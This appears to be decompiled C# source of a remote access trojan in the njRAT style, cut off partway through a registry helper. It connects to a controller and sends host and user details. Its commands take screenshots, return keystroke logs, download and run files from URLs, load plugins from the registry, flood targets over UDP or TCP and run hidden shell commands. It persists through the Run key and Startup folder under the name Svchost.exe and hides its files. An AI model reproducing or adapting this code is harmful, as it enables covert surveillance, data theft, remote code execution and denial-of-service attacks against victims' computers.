using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using B.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[assembly: AssemblyCompany("")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: AssemblyCopyright("Copyright ©  2017")]
[assembly: CompilationRelaxations(8)]
[assembly: Guid("ab670678-0cae-4d28-9df7-df30c6109483")]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
[assembly: AssemblyTitle("B")]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: AssemblyProduct("B")]
[assembly: AssemblyVersion("1.0.0.0")]
namespace B.My
{
	[GeneratedCode("MyTemplate", "8.0.0.0")]
	[EditorBrowsable(EditorBrowsableState.Never)]
	internal class MyApplication : ConsoleApplicationBase
	{
		[DebuggerNonUserCode]
		public MyApplication()
		{
		}
	}
	[EditorBrowsable(EditorBrowsableState.Never)]
	[GeneratedCode("MyTemplate", "8.0.0.0")]
	internal class MyComputer : Computer
	{
		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public MyComputer()
		{
		}
	}
	[GeneratedCode("MyTemplate", "8.0.0.0")]
	[HideModuleName]
	[StandardModule]
	internal sealed class MyProject
	{
		[EditorBrowsable(EditorBrowsableState.Never)]
		[MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
		internal sealed class MyForms
		{
			[ThreadStatic]
			private static Hashtable m_FormBeingCreated;

			[DebuggerHidden]
			private static T Create__Instance__<T>(T Instance) where T : Form, new()
			{
				if (Instance == null || (((Control)Instance).IsDisposed ? true : false))
				{
					if (m_FormBeingCreated != null)
					{
						if (m_FormBeingCreated.ContainsKey(typeof(T)))
						{
							throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate"));
						}
					}
					else
					{
						m_FormBeingCreated = new Hashtable();
					}
					m_FormBeingCreated.Add(typeof(T), null);
					try
					{
						return new T();
					}
					catch (TargetInvocationException ex) when (((Func<bool>)delegate
					{
						// Could not convert BlockContainer to single expression
						ProjectData.SetProjectError(ex);
						return ex.InnerException != null;
					}).Invoke())
					{
						string resourceString = Utils.GetResourceString("WinForms_SeeInnerException", ex.InnerException.Message);
						throw new InvalidOperationException(resourceString, ex.InnerException);
					}
					finally
					{
						m_FormBeingCreated.Remove(typeof(T));
					}
				}
				return Instance;
			}

			[DebuggerHidden]
			private void Dispose__Instance__<T>(ref T instance) where T : Form
			{
				((Component)instance/*cast due to constrained. prefix*/).Dispose();
				instance = default(T);
			}

			[DebuggerHidden]
			[EditorBrowsable(EditorBrowsableState.Never)]
			public MyForms()
			{
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			public override bool Equals(object o)
			{
				return base.Equals(RuntimeHelpers.GetObjectValue(o));
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			public override int GetHashCode()
			{
				return base.GetHashCode();
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			internal new Type GetType()
			{
				return typeof(MyForms);
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			public override string ToString()
			{
				return base.ToString();
			}
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
		internal sealed class MyWebServices
		{
			[EditorBrowsable(EditorBrowsableState.Never)]
			[DebuggerHidden]
			public override bool Equals(object o)
			{
				return base.Equals(RuntimeHelpers.GetObjectValue(o));
			}

			[DebuggerHidden]
			[EditorBrowsable(EditorBrowsableState.Never)]
			public override int GetHashCode()
			{
				return base.GetHashCode();
			}

			[DebuggerHidden]
			[EditorBrowsable(EditorBrowsableState.Never)]
			internal new Type GetType()
			{
				return typeof(MyWebServices);
			}

			[DebuggerHidden]
			[EditorBrowsable(EditorBrowsableState.Never)]
			public override string ToString()
			{
				return base.ToString();
			}

			[DebuggerHidden]
			private static T Create__Instance__<T>(T instance) where T : new()
			{
				if (instance == null)
				{
					return new T();
				}
				return instance;
			}

			[DebuggerHidden]
			private void Dispose__Instance__<T>(ref T instance)
			{
				instance = default(T);
			}

			[DebuggerHidden]
			[EditorBrowsable(EditorBrowsableState.Never)]
			public MyWebServices()
			{
			}
		}

		[ComVisible(false)]
		[EditorBrowsable(EditorBrowsableState.Never)]
		internal sealed class ThreadSafeObjectProvider<T> where T : new()
		{
			[CompilerGenerated]
			[ThreadStatic]
			private static T m_ThreadStaticValue;

			internal T GetInstance
			{
				[DebuggerHidden]
				get
				{
					if (m_ThreadStaticValue == null)
					{
						m_ThreadStaticValue = new T();
					}
					return m_ThreadStaticValue;
				}
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			[DebuggerHidden]
			public ThreadSafeObjectProvider()
			{
			}
		}

		private static readonly ThreadSafeObjectProvider<MyComputer> m_ComputerObjectProvider = new ThreadSafeObjectProvider<MyComputer>();

		private static readonly ThreadSafeObjectProvider<MyApplication> m_AppObjectProvider = new ThreadSafeObjectProvider<MyApplication>();

		private static readonly ThreadSafeObjectProvider<User> m_UserObjectProvider = new ThreadSafeObjectProvider<User>();

		private static ThreadSafeObjectProvider<MyForms> m_MyFormsObjectProvider = new ThreadSafeObjectProvider<MyForms>();

		private static readonly ThreadSafeObjectProvider<MyWebServices> m_MyWebServicesObjectProvider = new ThreadSafeObjectProvider<MyWebServices>();

		[HelpKeyword("My.Computer")]
		internal static MyComputer Computer
		{
			[DebuggerHidden]
			get
			{
				return m_ComputerObjectProvider.GetInstance;
			}
		}

		[HelpKeyword("My.Application")]
		internal static MyApplication Application
		{
			[DebuggerHidden]
			get
			{
				return m_AppObjectProvider.GetInstance;
			}
		}

		[HelpKeyword("My.User")]
		internal static User User
		{
			[DebuggerHidden]
			get
			{
				return m_UserObjectProvider.GetInstance;
			}
		}

		[HelpKeyword("My.Forms")]
		internal static MyForms Forms
		{
			[DebuggerHidden]
			get
			{
				return m_MyFormsObjectProvider.GetInstance;
			}
		}

		[HelpKeyword("My.WebServices")]
		internal static MyWebServices WebServices
		{
			[DebuggerHidden]
			get
			{
				return m_MyWebServicesObjectProvider.GetInstance;
			}
		}
	}
}
namespace B
{
	public class B
	{
		private TcpClient TCP;

		private BinaryFormatter bf;

		private bool RE;

		private string App;

		private object Logs;

		private bool AC;

		private Mutex MT;

		private bool OW;

		private string SR;

		private string H;

		private string P;

		private string Y;

		private string HP;

		private string ID;

		private string VL;

		private bool ST;

		private string EXE;

		private string DR;

		private bool CSTP;

		private bool SD;

		public B()
		{
			bf = new BinaryFormatter();
			RE = true;
			App = Application.ExecutablePath;
			Logs = null;
			AC = true;
			OW = false;
			SR = "software\\microsoft\\windows\\currentversion\\run";
			H = null;
			P = null;
			Y = "|-|";
			HP = "MTI3LjAuMC4xOjU1NTIs";
			ID = "Q2xpZW50Xzg4NzM5OQ==";
			VL = "{FKJTATXA-334694-MRQ1H1-MRQ1H1DHCN}";
			ST = Conversions.ToBoolean("False");
			EXE = "Svchost.exe";
			DR = "TEMP";
			CSTP = Conversions.ToBoolean("False");
			SD = false;
		}

		[STAThread]
		public static void main()
		{
			B b = new B();
			b.OK();
		}

		public void Connect()
		{
			while (true)
			{
				if (TCP == null)
				{
					FileInfo fileInfo = new FileInfo(App);
					string text = null;
					string text2 = null;
					text = GV("Software\\" + VL, "ID");
					text2 = ((Operators.CompareString(text, null, TextCompare: false) != 0) ? text : ID);
					try
					{
						TCP = new TcpClient(H, Conversions.ToInteger(P));
						Send(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(string.Concat("LOGIN" + Y, text2), Y), EC(Environment.MachineName + "@" + Environment.UserName)), Y), EC(((ServerComputer)MyProject.Computer).Info.OSFullName)), Y), CM()), Y), "1.0.40.7"), Y), EC(AW())), Y), EC(text2 + "," + H + "," + P + "," + EXE + "," + VL + "," + DR + "," + Conversions.ToString(ST) + "," + Conversions.ToString(CSTP) + ",")), Y), new FileInfo(App).LastWriteTime.ToString("yyyy-MM-dd")));
						TCP.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, Read, null);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						Disconnect();
						ProjectData.ClearProjectError();
					}
				}
				Thread.Sleep(10000);
			}
		}

		public void Read(IAsyncResult ar)
		{
			int try0001_dispatch = -1;
			int num3 = default(int);
			int num = default(int);
			int num2 = default(int);
			Thread thread = default(Thread);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0009;
					case 316:
						{
							num = num2;
							switch ((num3 <= -2) ? 1 : num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = num + 1;
							num = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_0036;
							case 4:
								goto IL_004c;
							case 5:
								goto IL_0057;
							case 6:
								goto IL_0062;
							case 7:
								goto IL_0087;
							case 8:
								goto IL_009b;
							case 11:
								goto IL_00d3;
							case 10:
							case 12:
							case 13:
							case 14:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 9:
							case 15:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_0087:
						num2 = 7;
						TCP.GetStream().Flush();
						goto IL_009b;
						IL_009b:
						num2 = 8;
						TCP.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, Read, null);
						goto end_IL_0001_3;
						IL_0062:
						num2 = 6;
						thread.Start((byte[])bf.Deserialize(TCP.GetStream()));
						goto IL_0087;
						IL_00d3:
						num2 = 11;
						break;
						IL_0009:
						num2 = 2;
						if (TCP.GetStream().DataAvailable & TCP.GetStream().CanRead)
						{
							goto IL_0036;
						}
						goto IL_00d3;
						IL_0036:
						num2 = 3;
						thread = new Thread([SpecialName] [DebuggerStepThrough] (object a0) =>
						{
							Data((byte[])a0);
						});
						goto IL_004c;
						IL_004c:
						num2 = 4;
						thread.IsBackground = true;
						goto IL_0057;
						IL_0057:
						num2 = 5;
						thread.SetApartmentState(ApartmentState.STA);
						goto IL_0062;
						end_IL_0001_2:
						break;
					}
					num2 = 14;
					Disconnect();
					break;
					end_IL_0001:;
				}
				catch (object obj) when ((obj is Exception) & (num3 != 0) & (num == 0))
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 316;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		public void Disconnect()
		{
			int try0001_dispatch = -1;
			int num3 = default(int);
			int num = default(int);
			int num2 = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0009;
					case 114:
						{
							num = num2;
							switch ((num3 <= -2) ? 1 : num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = num + 1;
							num = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_001b;
							case 4:
								goto IL_002e;
							case 5:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 6:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_0009:
						num2 = 2;
						if (TCP == null)
						{
							goto end_IL_0001_3;
						}
						goto IL_001b;
						IL_001b:
						num2 = 3;
						TCP.GetStream().Dispose();
						goto IL_002e;
						IL_002e:
						num2 = 4;
						TCP.Close();
						break;
						end_IL_0001_2:
						break;
					}
					num2 = 5;
					TCP = null;
					break;
					end_IL_0001:;
				}
				catch (object obj) when ((obj is Exception) & (num3 != 0) & (num == 0))
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 114;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		public void Send(object o)
		{
			Thread thread = new Thread(SendData);
			thread.Start(RuntimeHelpers.GetObjectValue(o));
		}

		public void SendData(object o)
		{
			object obj;
			try
			{
				obj = SB(Conversions.ToString(o));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				obj = RuntimeHelpers.GetObjectValue(o);
				ProjectData.ClearProjectError();
			}
			while (SD)
			{
				Application.DoEvents();
			}
			try
			{
				SD = true;
				bf.Serialize(TCP.GetStream(), RuntimeHelpers.GetObjectValue(obj));
				SD = false;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				Disconnect();
				SD = false;
				ProjectData.ClearProjectError();
			}
		}

		public void Data(byte[] b)
		{
			//IL_0062: Unknown result type (might be due to invalid IL or missing references)
			//IL_0069: Expected O, but got Unknown
			//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d6: Expected O, but got Unknown
			//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00eb: Expected O, but got Unknown
			object obj = null;
			object obj2 = null;
			string[] array = Strings.Split(BS(b), Y);
			checked
			{
				try
				{
					switch (array[0])
					{
					case "Sc":
					{
						Bitmap val = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						Size size = new Size(((Image)val).Width, ((Image)val).Height);
						val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
						val2.Dispose();
						MemoryStream memoryStream = new MemoryStream();
						b = SB("Sc" + Y);
						memoryStream.Write(b, 0, b.Length);
						EncoderParameters val3 = new EncoderParameters(1);
						val3.Param[0] = new EncoderParameter(Encoder.Quality, 50L);
						ImageCodecInfo encoderInfo = GetEncoderInfo("image/jpeg");
						MemoryStream memoryStream2 = new MemoryStream();
						IntPtr intPtr = default(IntPtr);
						((Image)val).GetThumbnailImage(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), (GetThumbnailImageAbort)null, intPtr).Save((Stream)memoryStream2, encoderInfo, val3);
						memoryStream.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
						Send(memoryStream.ToArray());
						memoryStream.Dispose();
						memoryStream2.Dispose();
						((Image)val).Dispose();
						break;
					}
					case "Svr":
						switch (array[1])
						{
						case "~":
							Application.Restart();
							Thread.Sleep(10);
							ProjectData.EndApp();
							break;
						case "!":
							ProjectData.EndApp();
							break;
						case "#":
							RE = false;
							UNS();
							break;
						case "$":
						{
							string text = null;
							obj2 = GV("Software\\" + VL, "H");
							if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj2, null, TextCompare: false))))
							{
								text = Conversions.ToString(DC(Conversions.ToString(obj2)));
								obj2 = text.Replace(array[2], "");
								obj2 = Operators.AddObject(obj2, array[2]);
								if (SB(Conversions.ToString(obj2)).Length != SB(Conversions.ToString(DC(GV("Software\\" + VL, "H")))).Length)
								{
									B b2 = new B();
									b2.CN(array[2], c: false);
									SV("Software\\" + VL, "H", Conversions.ToString(EC(Conversions.ToString(obj2))));
								}
							}
							break;
						}
						case "@":
							SV("Software\\" + VL, "ID", array[2]);
							break;
						}
						break;
					case "more":
						try
						{
							b = (byte[])NewLateBinding.LateIndexGet(FX(b, array[0] + Y + array[1] + Y), new object[1] { 1 }, null);
							SV("Software\\" + VL + "\\Plugins", array[1], T64(b));
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						obj2 = GV("Software\\" + VL + "\\Plugins", array[1]);
						if (Operators.ConditionalCompareObjectEqual(obj2, null, TextCompare: false))
						{
							Send("more" + Y + array[1]);
							break;
						}
						try
						{
							b = Unzip(F64(Conversions.ToString(obj2)));
							obj = RuntimeHelpers.GetObjectValue(PL(b, "A"));
							NewLateBinding.LateSet(obj, null, "H", new object[1] { H }, null, null);
							NewLateBinding.LateSet(obj, null, "P", new object[1] { P }, null, null);
							NewLateBinding.LateSet(obj, null, "Y", new object[1] { Y }, null, null);
							NewLateBinding.LateCall(obj, null, "start", new object[0], null, null, null, IgnoreReturn: true);
							break;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							DV("Software\\" + VL + "\\Plugins", array[1]);
							ProjectData.ClearProjectError();
							break;
						}
					case "Execute":
						try
						{
							Random random = new Random();
							object instance = new WebClient();
							obj2 = Interaction.Environ("temp") + "\\" + Conversions.ToString(random.Next(1, 21123213)) + array[1];
							object[] array2;
							bool[] array5;
							if (!array[2].ToLower().StartsWith("http"))
							{
								obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(FX(b, array[0] + Y + array[1] + Y + array[2] + Y + array[3] + Y), new object[1] { 1 }, null));
							}
							else
							{
								array2 = new object[1];
								object[] array3 = array2;
								int num2 = 2;
								array3[0] = array[num2];
								object[] array4 = array2;
								object[] arguments = array4;
								array5 = new bool[1] { true };
								object obj3 = NewLateBinding.LateGet(instance, null, "DownloadData", arguments, null, null, array5);
								if (array5[0])
								{
									array[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
								}
								obj = RuntimeHelpers.GetObjectValue(obj3);
							}
							File.WriteAllBytes(Conversions.ToString(obj2), (byte[])obj);
							Type? typeFromHandle = typeof(Process);
							array2 = new object[1] { RuntimeHelpers.GetObjectValue(obj2) };
							object[] arguments2 = array2;
							array5 = new bool[1] { true };
							NewLateBinding.LateCall(null, typeFromHandle, "Start", arguments2, null, null, array5, IgnoreReturn: true);
							if (array5[0])
							{
								obj2 = RuntimeHelpers.GetObjectValue(array2[0]);
							}
							if (Operators.CompareString(array[3], "r", TextCompare: false) == 0)
							{
								Send("MSG" + Y + "Executed As " + new FileInfo(Conversions.ToString(obj2)).Name);
								break;
							}
							Send("MSG" + Y + "Update As " + new FileInfo(Conversions.ToString(obj2)).Name);
							UNS();
							break;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							if (Operators.CompareString(array[3], "r", TextCompare: false) == 0)
							{
								Send("ERROR" + Y + "Execute ERROR");
							}
							else
							{
								Send("ERROR" + Y + "Update ERROR ");
							}
							ProjectData.ClearProjectError();
							break;
						}
					case "Lg":
						obj = DateTime.Now.Date;
						switch (array[1])
						{
						case "~":
						{
							string[] valueNames = Registry.CurrentUser.CreateSubKey("Software\\" + VL + "\\Log").GetValueNames();
							foreach (string text2 in valueNames)
							{
								obj2 = Operators.AddObject(obj2, text2 + "[,]");
							}
							if (Operators.ConditionalCompareObjectEqual(obj2, null, TextCompare: false))
							{
								Send(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(string.Concat("Lg" + Y, "~"), Y), obj), "[,]"));
							}
							else
							{
								Send(Operators.ConcatenateObject(string.Concat(string.Concat("Lg" + Y, "~"), Y), obj2));
							}
							break;
						}
						case "!":
							if (Operators.ConditionalCompareObjectEqual(array[2], obj, TextCompare: false))
							{
								Send(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(string.Concat("Lg" + Y, "!"), Y), EC(Conversions.ToString(NewLateBinding.LateGet(Logs, null, "Logs", new object[0], null, null, null)))), Y), array[2]));
							}
							else
							{
								Send(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(string.Concat("Lg" + Y, "!"), Y), EC(GV("Software\\" + VL + "\\Log", array[2]).ToString())), Y), array[2]));
							}
							break;
						case "@":
							DV("Software\\" + VL + "\\Log", array[2]);
							Send("Lg" + Y + "@" + Y + array[2]);
							break;
						}
						break;
					case "FLD":
					{
						string ipString = array[1];
						string value = array[2];
						string left = array[3];
						string value2 = array[4];
						int num = 0;
						while (true)
						{
							try
							{
								IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(ipString), Conversions.ToInteger(value));
								if (Operators.CompareString(left, "UDP", TextCompare: false) == 0)
								{
									byte[] buffer = new byte[4096];
									Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
									socket.Connect(remoteEP);
									socket.SendTo(buffer, remoteEP);
								}
								else if (Operators.CompareString(left, "TCP", TextCompare: false) == 0)
								{
									Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
									socket2.Connect(remoteEP);
									socket2.Close();
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							if ((double)num == Conversions.ToDouble(value2) * 60.0)
							{
								break;
							}
							num++;
							Thread.Sleep(1);
						}
						break;
					}
					case "P":
						Send("P");
						break;
					case "Shl":
						SH(array[1]);
						break;
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					try
					{
						Send("ERROR" + Y + ex2.Message);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
				}
			}
		}

		public void OK()
		{
			string text = null;
			string text2 = null;
			int num = 0;
			text = GV("Software\\" + VL, "H");
			if (Operators.CompareString(text, "", TextCompare: false) == 0)
			{
				SV("Software\\" + VL, "H", HP);
				text = GV("Software\\" + VL, "H");
				text2 = Conversions.ToString(DC(text));
			}
			else
			{
				text2 = Conversions.ToString(DC(text));
			}
			string[] array = Strings.Split(text2, ",");
			foreach (string text3 in array)
			{
				if (text3.Length != 0)
				{
					if (num == 0)
					{
						B b = new B();
						b.CN(text3, c: true);
					}
					else
					{
						B b2 = new B();
						b2.CN(text3, c: false);
					}
				}
				num = checked(num + 1);
			}
		}

		public void CN(string s, bool c)
		{
			try
			{
				string[] array = Strings.Split(s, ":");
				H = array[0];
				P = array[1];
				AC = c;
				Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public void ACT()
		{
			int num = 0;
			int num2 = 0;
			checked
			{
				while (true)
				{
					if (num == 150)
					{
						num = 0;
						if (AW().Length != 0)
						{
							Send(Operators.ConcatenateObject("Ac" + Y, EC(AW())));
						}
					}
					if (num2 == 70)
					{
						num2 = 0;
						if (RE && ST)
						{
							INS();
						}
					}
					num++;
					num2++;
					Thread.Sleep(100);
				}
			}
		}

		public void Start()
		{
			if (AC)
			{
				Thread.Sleep(5000);
				MT = new Mutex(initiallyOwned: true, VL, out OW);
				if (!OW)
				{
					ProjectData.EndApp();
				}
				MT.ReleaseMutex();
				if (ST)
				{
					try
					{
						if (File.Exists(Interaction.Environ(DR) + "\\" + EXE))
						{
							File.Delete(Interaction.Environ(DR) + "\\" + EXE);
						}
						File.Copy(App, Interaction.Environ(DR) + "\\" + EXE);
						Process.Start(Interaction.Environ(DR) + "\\" + EXE);
						ProjectData.EndApp();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					INS();
				}
				Logs = new LG();
				NewLateBinding.LateSet(Logs, null, "VL", new object[1] { VL }, null, null);
				NewLateBinding.LateCall(Logs, null, "Start", new object[0], null, null, null, IgnoreReturn: true);
			}
			Thread thread = new Thread(Connect);
			Thread thread2 = new Thread(ACT);
			thread.Start();
			thread2.Start();
		}

		public void INS()
		{
			if (CSTP)
			{
				try
				{
					File.Copy(App, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + VL + ".exe", overwrite: true);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					FileSystem.SetAttr(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + VL + ".exe", FileAttribute.Hidden);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				File.Copy(App, Interaction.Environ(DR) + "\\" + EXE);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				FileSystem.SetAttr(App, FileAttribute.Hidden);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			SV(SR, VL, "\"" + App + "\" ...");
		}

		public void UNS()
		{
			if (CSTP)
			{
				try
				{
					FileSystem.SetAttr(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + VL + ".exe", (FileAttribute)128);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + VL + ".exe");
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			DV(SR, VL);
			DS("software", VL);
			try
			{
				FileSystem.SetAttr(App, FileAttribute.Normal);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			SH("cmd.exe /k ping 0 & del \"" + App + "\" & exit");
			ProjectData.EndApp();
		}

		public object PL(byte[] b, string c)
		{
			Module[] modules = Assembly.Load(b).GetModules();
			foreach (object instance in modules)
			{
				foreach (Type item in (IEnumerable)NewLateBinding.LateGet(instance, null, "GetTypes", new object[0], null, null, null))
				{
					if (item.FullName.EndsWith("." + c))
					{
						return NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Assembly", new object[0], null, null, null), null, "CreateInstance", new object[1] { item.FullName }, null, null, null);
					}
				}
			}
			return null;
		}

		public void SH(string S)
		{
			int try0001_dispatch = -1;
			int num3 = default(int);
			int num = default(int);
			int num2 = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						break;
					case 54:
						{
							num = num2;
							switch ((num3 <= -2) ? 1 : num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = num + 1;
							num = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 3:
								goto end_IL_0001_3;
							}
							goto default;
						}
						end_IL_0001_2:
						break;
					}
					num2 = 2;
					Interaction.Shell(S, AppWinStyle.Hide);
					break;
					end_IL_0001:;
				}
				catch (object obj) when ((obj is Exception) & (num3 != 0) & (num == 0))
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 54;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		public void SV(string P, string N, string B)
		{
			int try0001_dispatch = -1;
			int num3 = default(int);
			int num = default(int);
			int num2 = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						break;
					case 63:
						{
							num = num2;
							switch ((num3 <= -2) ? 1 : num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = num + 1;
							num = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 3:
								goto end_IL_0001_3;
							}
							goto default;
						}
						end_IL_0001_2:
						break;
					}
					num2 = 2;
					Registry.CurrentUser.CreateSubKey(P).SetValue(N, B);
					break;
					end_IL_0001:;
				}
				catch (object obj) when ((obj is Exception) & (num3 != 0) & (num == 0))
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 63;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		public string GV(string P, string N)
		{
			string result;
			try
			{
				result = Registry.CurrentUser.CreateSubKey(P).GetValue(N, null).ToString();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = null;
				ProjectData.ClearProjectError();
			}
			return result;
		}

		public void DV(string P, string N)
		{
			int try0001_dispatch = -1;
			int num3 = default(int);
			int num = default(int);
			int num2 = default(int);
